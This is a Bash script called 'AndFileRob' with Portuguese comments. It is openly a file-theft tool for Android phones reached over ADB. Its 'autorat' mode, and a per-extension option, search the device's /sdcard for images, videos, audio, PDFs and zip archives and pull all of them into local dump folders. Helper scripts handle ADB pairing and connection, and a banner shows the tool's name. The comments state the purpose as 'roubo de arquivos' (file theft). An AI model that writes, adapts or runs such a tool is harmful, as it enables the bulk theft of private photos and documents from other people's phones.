#!/bin/bash

# Definindo códigos de cores ANSI
GREEN='\033[0;32m'
BLUE='\033[0;34m'     # INFO
YELLOW='\033[1;33m'   # WARNING
RED='\033[0;31m'      # ERROR
NC='\033[0m'          # No Color (reset)

# Formatar a data no formato dd-mm-aaaa_hh-mm
data=$(date +"%d-%m-%Y_%H-%M")

# Função para exibir mensagens com diferentes níveis de verbosidade
log_message() {
    level=$1
    message=$2

    case $level in
        "info")
            echo -e "${BLUE}[INFO]: ${message}${NC}"
            ;;
        "warning")
            echo -e "${YELLOW}[WARNING]: ${message}${NC}"
            ;;
        "error")
            echo -e "${RED}[ERROR]: ${message}${NC}"
            ;;
        *)
            echo -e "[UNKNOWN]: ${message}"
            ;;
    esac
}

# Função para exibir o banner
banner() {
    for i in {1..2}; do
        if adb devices | grep -w "device" &> /dev/null; then
            COLOR=$GREEN
        else
            COLOR=$RED
        fi
        clear
        echo -e "${COLOR}.-----------------------------------------------------------.${NC}"
        echo -e "${COLOR}|                     _ ______ _ _      _____       _       |${NC}"
        echo -e "${COLOR}|     /\             | |  ____(_) |    |  __ \     | |      |${NC}"
        echo -e "${COLOR}|    /  \   _ __   __| | |__   _| | ___| |__) |___ | |__    |${NC}"
        echo -e "${COLOR}|   / /\ \ | '_ \ / _  |  __| | | |/ _ \  _  // _ \| '_ \   |${NC}"
        echo -e "${COLOR}|  / ____ \| | | | (_| | |    | | |  __/ | \ \ (_) | |_) |  |${NC}"
        echo -e "${COLOR}| /_/    \_\_| |_|\__,_|_|    |_|_|\___|_|  \_\___/|_.__/   |${NC}"
        echo -e "${COLOR}|                                                           |${NC}"
        echo -e "${COLOR}|                                                   V 1.5   |${NC}"
        echo -e "${COLOR}'-----------------------------------------------------------'${NC}"
        adb wait-for-device
        if [[ "$COLOR" == "$GREEN" ]]; then
            break
        fi
    done
}

# Função para executar o script fastpair.sh
run_fastpair() {
    if [[ -f fastpair.sh ]]; then
        bash fastpair.sh
        if [ $? -ne 0 ]; then
            exit 1
        fi
    else
        log_message error "Script 'fastpair.sh' não encontrado."
        exit 1
    fi
}

# Função para executar o script fastconnect.sh
run_fastconnect() {
    if [[ -f fastconnect.sh ]]; then
        bash fastconnect.sh
        if [ $? -ne 0 ]; then
            exit 1
        fi
    else
        log_message error "Script 'fastconnect.sh' não encontrado."
        exit 1
    fi
}

# Função para realizar o roubo de arquivos
autorat() {
    local filenames=("jpg" "png" "jpeg" "gif" "raw" "webp" "opus" "mp4" "pdf" "zip")
    for element in "${filenames[@]}"; do
        while true; do
            andfilerob "$element"
            exitcode=$?
            if [ $exitcode -eq 0 ]; then
                break
            else
                log_message error "Erro na pasta de $element"
                adb wait-for-device
            fi
        done
    done
}

# Função para realizar o download de arquivos do dispositivo Android
andfilerob() {
    local filename=$1
    local path="./AndFileRob_Dumps/$filename"
    mkdir -p "$path"

    log_message info "Data atual: $data"
    log_message info "Caminho dos arquivos: $path"
    log_message warning "INICIANDO..."

    sleep 1

    adb shell find /sdcard/ -type f -iname "*.$filename" | while read -r file; do
        adb pull "$file" "./$path"
    done
}

# Função para exibir a ajuda
usage() {
    echo "Uso: $0 [-p] [-c] [-a] [-f <extensão>]"
    echo "  -p          Executa o script fastpair.sh"
    echo "  -c          Executa o script fastconnect.sh"
    echo "  -a          Executa o script autorat (roubo de arquivos)"
    echo "  -f <extensão> Executa o script andfilerob para a extensão especificada"
    exit 1
}

# Parser de argumentos
while getopts "pca:f:" opt; do
    case "$opt" in
        p) run_fastpair ;;
        c) run_fastconnect ;;
        a) autorat ;;
        f) andfilerob "$OPTARG" ;;
        *) usage ;;
    esac
done

# Se nenhum argumento for passado, exibir a ajuda
if [ $OPTIND -eq 1 ]; then
    usage
fi

# Exibir o banner
banner
